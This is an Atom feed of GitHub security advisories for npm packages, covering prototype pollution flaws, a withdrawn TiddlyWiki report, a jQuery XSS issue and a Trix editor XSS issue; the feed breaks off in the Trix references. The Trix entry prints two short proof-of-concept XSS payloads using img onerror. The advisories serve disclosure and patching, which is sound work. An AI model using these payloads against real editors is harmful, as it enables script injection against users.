<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-05-21T14:01:12.906Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@apidevtools/json-schema-ref-parser] json-schema-ref-parser Prototype Pollution issue]]></title>
        <id>https://github.com/advisories/GHSA-5f97-h2c2-826q</id>
        <link href="https://github.com/advisories/GHSA-5f97-h2c2-826q"/>
        <updated>2024-05-20T21:03:14.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in API Dev Tools json-schema-ref-parser v.11.0.0 and v.11.1.0 allows a remote attacker to execute arbitrary code via the <code>bundle()</code>, <code>parse()</code>, <code>resolve()</code>, <code>dereference()</code> functions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29651">https://nvd.nist.gov/vuln/detail/CVE-2024-29651</a></li>
<li><a href="https://gist.github.com/tariqhawis/5db76b38112bba756615b688c32409ad">https://gist.github.com/tariqhawis/5db76b38112bba756615b688c32409ad</a></li>
<li><a href="https://github.com/APIDevTools/json-schema-ref-parser/commit/8cad7f72c15b198f4d0b5b1c8a3a979b2e4baa82">https://github.com/APIDevTools/json-schema-ref-parser/commit/8cad7f72c15b198f4d0b5b1c8a3a979b2e4baa82</a></li>
<li><a href="https://github.com/advisories/GHSA-5f97-h2c2-826q">https://github.com/advisories/GHSA-5f97-h2c2-826q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5f97-h2c2-826q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-20T18:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@bit/loader] MiguelCastillo @bit/loader Prototype Pollution issue]]></title>
        <id>https://github.com/advisories/GHSA-8vr4-h4rr-8ph6</id>
        <link href="https://github.com/advisories/GHSA-8vr4-h4rr-8ph6"/>
        <updated>2024-05-20T20:56:15.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in MiguelCastillo @bit/loader v.10.0.3 allows an attacker to execute arbitrary code via the M function e argument in index.js.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24293">https://nvd.nist.gov/vuln/detail/CVE-2024-24293</a></li>
<li><a href="https://gist.github.com/tariqhawis/986fb1c9da6be526fb2656ba8d194b7f">https://gist.github.com/tariqhawis/986fb1c9da6be526fb2656ba8d194b7f</a></li>
<li><a href="https://github.com/advisories/GHSA-8vr4-h4rr-8ph6">https://github.com/advisories/GHSA-8vr4-h4rr-8ph6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8vr4-h4rr-8ph6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-20T18:31:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@blackprint/engine] Blackprint @blackprint/engine Prototype Pollution issue]]></title>
        <id>https://github.com/advisories/GHSA-g3q2-vcjq-rgrc</id>
        <link href="https://github.com/advisories/GHSA-g3q2-vcjq-rgrc"/>
        <updated>2024-05-20T20:54:11.000Z</updated>
        <content type="html"><![CDATA[<p>A Prototype Pollution issue in Blackprint @blackprint/engine 0.8.12 through 0.9.1 allows an attacker to execute arbitrary code via the <code>_utils.setDeepProperty</code> function of <code>engine.min.js</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24294">https://nvd.nist.gov/vuln/detail/CVE-2024-24294</a></li>
<li><a href="https://gist.github.com/mestrtee/d1eb6e1f7c6dd60d8838c3e56cab634d">https://gist.github.com/mestrtee/d1eb6e1f7c6dd60d8838c3e56cab634d</a></li>
<li><a href="https://github.com/Blackprint/engine-js/commit/bd6b965b03c467e7a58ab0cb89b9172fa5e07013">https://github.com/Blackprint/engine-js/commit/bd6b965b03c467e7a58ab0cb89b9172fa5e07013</a></li>
<li><a href="https://github.com/advisories/GHSA-g3q2-vcjq-rgrc">https://github.com/advisories/GHSA-g3q2-vcjq-rgrc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g3q2-vcjq-rgrc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-20T18:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tiddlywiki] Withdrawn: Code execution via SVG file upload in tiddlywiki]]></title>
        <id>https://github.com/advisories/GHSA-cr9c-rhq6-vh53</id>
        <link href="https://github.com/advisories/GHSA-cr9c-rhq6-vh53"/>
        <updated>2024-05-17T18:36:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="withdrawn-advisory">Withdrawn Advisory</h2>
<p>This advisory has been withdrawn because it has been found to not be valid. Please see the issue <a href="https://github.com/Jermolene/TiddlyWiki5/issues/7384">here</a> for more information.</p>
<h2 id="original-description">Original Description</h2>
<p>An arbitrary file upload vulnerability in the file upload module of Tiddlywiki5 v5.2.2 allows attackers to execute arbitrary code via a crafted SVG file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-29351">https://nvd.nist.gov/vuln/detail/CVE-2022-29351</a></li>
<li><a href="https://github.com/Jermolene/TiddlyWiki5">https://github.com/Jermolene/TiddlyWiki5</a></li>
<li><a href="https://github.com/jimcola99/corruptsvgfile">https://github.com/jimcola99/corruptsvgfile</a></li>
<li><a href="https://www.youtube.com/watch?v=F_DBx4psWns">https://www.youtube.com/watch?v=F_DBx4psWns</a></li>
<li><a href="http://tiddlywiki5.com">http://tiddlywiki5.com</a></li>
<li><a href="https://github.com/Jermolene/TiddlyWiki5/issues/7384">https://github.com/Jermolene/TiddlyWiki5/issues/7384</a></li>
<li><a href="https://github.com/advisories/GHSA-cr9c-rhq6-vh53">https://github.com/advisories/GHSA-cr9c-rhq6-vh53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cr9c-rhq6-vh53</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T00:01:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jquery] Potential XSS vulnerability in jQuery]]></title>
        <id>https://github.com/advisories/GHSA-jpcq-cgw6-v4j6</id>
        <link href="https://github.com/advisories/GHSA-jpcq-cgw6-v4j6"/>
        <updated>2024-05-15T19:48:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Passing HTML containing <code>&lt;option&gt;</code> elements from untrusted sources - even after sanitizing them - to one of jQuery's DOM manipulation methods (i.e. <code>.html()</code>, <code>.append()</code>, and others) may execute untrusted code.</p>
<h3 id="patches">Patches</h3>
<p>This problem is patched in jQuery 3.5.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>To workaround this issue without upgrading, use <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> with its <code>SAFE_FOR_JQUERY</code> option to sanitize the HTML string before passing it to a jQuery method.</p>
<h3 id="references">References</h3>
<p><a href="https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/">https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, search for a relevant issue in <a href="https://github.com/jquery/jquery/issues">the jQuery repo</a>. If you don't find an answer, open a new issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/jquery/jquery/security/advisories/GHSA-jpcq-cgw6-v4j6">https://github.com/jquery/jquery/security/advisories/GHSA-jpcq-cgw6-v4j6</a></li>
<li><a href="https://blog.jquery.com/2020/04/10/jquery-3-5-0-released">https://blog.jquery.com/2020/04/10/jquery-3-5-0-released</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11023">https://nvd.nist.gov/vuln/detail/CVE-2020-11023</a></li>
<li><a href="https://www.drupal.org/sa-core-2020-002">https://www.drupal.org/sa-core-2020-002</a></li>
<li><a href="https://www.debian.org/security/2020/dsa-4693">https://www.debian.org/security/2020/dsa-4693</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00067.html">http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00067.html</a></li>
<li><a href="https://security.gentoo.org/glsa/202007-03">https://security.gentoo.org/glsa/202007-03</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00085.html">http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00085.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r0593393ca1e97b1e7e098fe69d414d6bd0a467148e9138d07e86ebbb@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r0593393ca1e97b1e7e098fe69d414d6bd0a467148e9138d07e86ebbb@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r094f435595582f6b5b24b66fedf80543aa8b1d57a3688fbcc21f06ec@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r094f435595582f6b5b24b66fedf80543aa8b1d57a3688fbcc21f06ec@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r1fed19c860a0d470f2a3eded12795772c8651ff583ef951ddac4918c@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/r1fed19c860a0d470f2a3eded12795772c8651ff583ef951ddac4918c@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4aadb98086ca72ed75391f54167522d91489a0d0ae25b12baa8fc7c5@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r4aadb98086ca72ed75391f54167522d91489a0d0ae25b12baa8fc7c5@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r6c4df3b33e625a44471009a172dabe6865faec8d8f21cac2303463b1@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r6c4df3b33e625a44471009a172dabe6865faec8d8f21cac2303463b1@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r6e97b37963926f6059ecc1e417721608723a807a76af41d4e9dbed49@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r6e97b37963926f6059ecc1e417721608723a807a76af41d4e9dbed49@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9c5fda81e4bca8daee305b4c03283dddb383ab8428a151d4cb0b3b15@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/r9c5fda81e4bca8daee305b4c03283dddb383ab8428a151d4cb0b3b15@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra32c7103ded9041c7c1cb8c12c8d125a6b2f3f3270e2937ef8417fac@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/ra32c7103ded9041c7c1cb8c12c8d125a6b2f3f3270e2937ef8417fac@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra374bb0299b4aa3e04edde01ebc03ed6f90cf614dad40dd428ce8f72@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/ra374bb0299b4aa3e04edde01ebc03ed6f90cf614dad40dd428ce8f72@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra3c9219fcb0b289e18e9ec5a5ebeaa5c17d6b79a201667675af6721c@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/ra3c9219fcb0b289e18e9ec5a5ebeaa5c17d6b79a201667675af6721c@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ra406b3adfcffcb5ce8707013bdb7c35e3ffc2776a8a99022f15274c6@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/ra406b3adfcffcb5ce8707013bdb7c35e3ffc2776a8a99022f15274c6@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rab82dd040f302018c85bd07d33f5604113573514895ada523c3401d9@%3Ccommits.hive.apache.org%3E">https://lists.apache.org/thread.html/rab82dd040f302018c85bd07d33f5604113573514895ada523c3401d9@%3Ccommits.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/radcb2aa874a79647789f3563fcbbceaf1045a029ee8806b59812a8ea@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/radcb2aa874a79647789f3563fcbbceaf1045a029ee8806b59812a8ea@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb25c3bc7418ae75cba07988dafe1b6912f76a9dd7d94757878320d61@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/rb25c3bc7418ae75cba07988dafe1b6912f76a9dd7d94757878320d61@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rb69b7d8217c1a6a2100247a5d06ce610836b31e3f5d73fc113ded8e7@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rb69b7d8217c1a6a2100247a5d06ce610836b31e3f5d73fc113ded8e7@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rd38b4185a797b324c8dd940d9213cf99fcdc2dbf1fc5a63ba7dee8c9@%3Cissues.hive.apache.org%3E">https://lists.apache.org/thread.html/rd38b4185a797b324c8dd940d9213cf99fcdc2dbf1fc5a63ba7dee8c9@%3Cissues.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rda99599896c3667f2cc9e9d34c7b6ef5d2bbed1f4801e1d75a2b0679@%3Ccommits.nifi.apache.org%3E">https://lists.apache.org/thread.html/rda99599896c3667f2cc9e9d34c7b6ef5d2bbed1f4801e1d75a2b0679@%3Ccommits.nifi.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf1ba79e564fe7efc56aef7c986106f1cf67a3427d08e997e088e7a93@%3Cgitbox.hive.apache.org%3E">https://lists.apache.org/thread.html/rf1ba79e564fe7efc56aef7c986106f1cf67a3427d08e997e088e7a93@%3Cgitbox.hive.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf661a90a15da8da5922ba6127b3f5f8194d4ebec8855d60a0dd13248@%3Cdev.hive.apache.org%3E">https://lists.apache.org/thread.html/rf661a90a15da8da5922ba6127b3f5f8194d4ebec8855d60a0dd13248@%3Cdev.hive.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2020.html">https://www.oracle.com/security-alerts/cpuoct2020.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r706cfbc098420f7113968cc377247ec3d1439bce42e679c11c609e2d@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r706cfbc098420f7113968cc377247ec3d1439bce42e679c11c609e2d@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rbb448222ba62c430e21e13f940be4cb5cfc373cd3bce56b48c0ffa67@%3Cdev.flink.apache.org%3E">https://lists.apache.org/thread.html/rbb448222ba62c430e21e13f940be4cb5cfc373cd3bce56b48c0ffa67@%3Cdev.flink.apache.org%3E</a></li>
<li><a href="http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00039.html">http://lists.opensuse.org/opensuse-security-announce/2020-11/msg00039.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r49ce4243b4738dd763caeb27fa8ad6afb426ae3e8c011ff00b8b1f48@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r49ce4243b4738dd763caeb27fa8ad6afb426ae3e8c011ff00b8b1f48@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r07ab379471fb15644bf7a92e4a98cbc7df3cf4e736abae0cc7625fe6@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r07ab379471fb15644bf7a92e4a98cbc7df3cf4e736abae0cc7625fe6@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r2c85121a47442036c7f8353a3724aa04f8ecdfda1819d311ba4f5330@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r2c85121a47442036c7f8353a3724aa04f8ecdfda1819d311ba4f5330@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r3702ede0ff83a29ba3eb418f6f11c473d6e3736baba981a8dbd9c9ef@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r3702ede0ff83a29ba3eb418f6f11c473d6e3736baba981a8dbd9c9ef@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r4dba67be3239b34861f1b9cfdf9dfb3a90272585dcce374112ed6e16@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r4dba67be3239b34861f1b9cfdf9dfb3a90272585dcce374112ed6e16@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r55f5e066cc7301e3630ce90bbbf8d28c82212ae1f2d4871012141494@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r55f5e066cc7301e3630ce90bbbf8d28c82212ae1f2d4871012141494@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9006ad2abf81d02a0ef2126bab5177987e59095b7194a487c4ea247c@%3Ccommits.felix.apache.org%3E">https://lists.apache.org/thread.html/r9006ad2abf81d02a0ef2126bab5177987e59095b7194a487c4ea247c@%3Ccommits.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r9e0bd31b7da9e7403478d22652b8760c946861f8ebd7bd750844898e@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/r9e0bd31b7da9e7403478d22652b8760c946861f8ebd7bd750844898e@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/rf0f8939596081d84be1ae6a91d6248b96a02d8388898c372ac807817@%3Cdev.felix.apache.org%3E">https://lists.apache.org/thread.html/rf0f8939596081d84be1ae6a91d6248b96a02d8388898c372ac807817@%3Cdev.felix.apache.org%3E</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2021.html">https://www.oracle.com/security-alerts/cpujan2021.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r564585d97bc069137e64f521e68ba490c7c9c5b342df5d73c49a0760@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r564585d97bc069137e64f521e68ba490c7c9c5b342df5d73c49a0760@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r8f70b0f65d6bedf316ecd899371fd89e65333bc988f6326d2956735c@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r8f70b0f65d6bedf316ecd899371fd89e65333bc988f6326d2956735c@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://www.tenable.com/security/tns-2021-02">https://www.tenable.com/security/tns-2021-02</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2021/03/msg00033.html">https://lists.debian.org/debian-lts-announce/2021/03/msg00033.html</a></li>
<li><a href="http://packetstormsecurity.com/files/162160/jQuery-1.0.3-Cross-Site-Scripting.html">http://packetstormsecurity.com/files/162160/jQuery-1.0.3-Cross-Site-Scripting.html</a></li>
<li><a href="https://lists.apache.org/thread.html/rede9cfaa756e050a3d83045008f84a62802fc68c17f2b4eabeaae5e4@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/rede9cfaa756e050a3d83045008f84a62802fc68c17f2b4eabeaae5e4@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/ree3bd8ddb23df5fa4e372d11c226830ea3650056b1059f3965b3fce2@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/ree3bd8ddb23df5fa4e372d11c226830ea3650056b1059f3965b3fce2@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/r54565a8f025c7c4f305355fdfd75b68eca442eebdb5f31c2e7d977ae@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r54565a8f025c7c4f305355fdfd75b68eca442eebdb5f31c2e7d977ae@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://lists.apache.org/thread.html/re4ae96fa5c1a2fe71ccbb7b7ac1538bd0cb677be270a2bf6e2f8d108@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/re4ae96fa5c1a2fe71ccbb7b7ac1538bd0cb677be270a2bf6e2f8d108@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://www.tenable.com/security/tns-2021-10">https://www.tenable.com/security/tns-2021-10</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuApr2021.html">https://www.oracle.com/security-alerts/cpuApr2021.html</a></li>
<li><a href="https://www.oracle.com//security-alerts/cpujul2021.html">https://www.oracle.com//security-alerts/cpujul2021.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuoct2021.html">https://www.oracle.com/security-alerts/cpuoct2021.html</a></li>
<li><a href="https://lists.apache.org/thread.html/r0483ba0072783c2e1bfea613984bfb3c86e73ba8879d780dc1cc7d36@%3Cissues.flink.apache.org%3E">https://lists.apache.org/thread.html/r0483ba0072783c2e1bfea613984bfb3c86e73ba8879d780dc1cc7d36@%3Cissues.flink.apache.org%3E</a></li>
<li><a href="https://github.com/jquery/jquery/releases/tag/3.5.0">https://github.com/jquery/jquery/releases/tag/3.5.0</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujan2022.html">https://www.oracle.com/security-alerts/cpujan2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpuapr2022.html">https://www.oracle.com/security-alerts/cpuapr2022.html</a></li>
<li><a href="https://www.oracle.com/security-alerts/cpujul2022.html">https://www.oracle.com/security-alerts/cpujul2022.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-11023.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-11023.yml</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-565440">https://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-565440</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/08/msg00040.html">https://lists.debian.org/debian-lts-announce/2023/08/msg00040.html</a></li>
<li><a href="https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77">https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SFP4UK4EGP4AFH2MWYJ5A5Z4I7XVFQ6B">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SFP4UK4EGP4AFH2MWYJ5A5Z4I7XVFQ6B</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SAPQVX3XDNPGFT26QAQ6AJIXZZBZ4CD4">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SAPQVX3XDNPGFT26QAQ6AJIXZZBZ4CD4</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QPN2L2XVQGUA2V5HNQJWHK3APSK3VN7K">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QPN2L2XVQGUA2V5HNQJWHK3APSK3VN7K</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AVKYXLWCLZBV2N7M46KYK4LVA5OXWPBY">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AVKYXLWCLZBV2N7M46KYK4LVA5OXWPBY</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-JQUERY-565129">https://snyk.io/vuln/SNYK-JS-JQUERY-565129</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20230725-0003">https://security.netapp.com/advisory/ntap-20230725-0003</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200511-0006">https://security.netapp.com/advisory/ntap-20200511-0006</a></li>
<li><a href="https://jquery.com/upgrade-guide/3.5">https://jquery.com/upgrade-guide/3.5</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-23064.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2020-23064.yml</a></li>
<li><a href="https://github.com/rails/jquery-rails/blob/v4.4.0/vendor/assets/javascripts/jquery3.js#L6162">https://github.com/rails/jquery-rails/blob/v4.4.0/vendor/assets/javascripts/jquery3.js#L6162</a></li>
<li><a href="https://github.com/rails/jquery-rails/blob/v4.3.5/vendor/assets/javascripts/jquery3.js#L5979">https://github.com/rails/jquery-rails/blob/v4.3.5/vendor/assets/javascripts/jquery3.js#L5979</a></li>
<li><a href="https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#440">https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#440</a></li>
<li><a href="https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#410">https://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#410</a></li>
<li><a href="https://github.com/advisories/GHSA-jpcq-cgw6-v4j6">https://github.com/advisories/GHSA-jpcq-cgw6-v4j6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpcq-cgw6-v4j6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2020-04-29T22:19:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-05-15T14:20:38.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: </p>
<ul>
<li>1.x series up to and including 1.3.1</li>
<li>2.x series up to and including 2.1.0</li>
</ul>
<p><strong>Fixed Versions</strong>: </p>
<ul>
<li>v1.3.2</li>
<li>v2.1.1</li>
</ul>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1153">https://github.com/basecamp/trix/pull/1153</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
